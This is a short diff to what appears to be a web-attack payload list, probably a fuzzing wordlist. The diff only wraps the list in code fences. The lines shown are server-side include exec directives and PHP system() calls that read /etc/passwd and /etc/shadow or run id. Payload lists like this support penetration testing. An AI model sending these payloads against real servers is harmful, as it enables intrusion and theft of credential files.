@@ -1,3 +1,4 @@
+```
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
@@ -100,3 +101,4 @@ cat /etc/passwd
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
+```
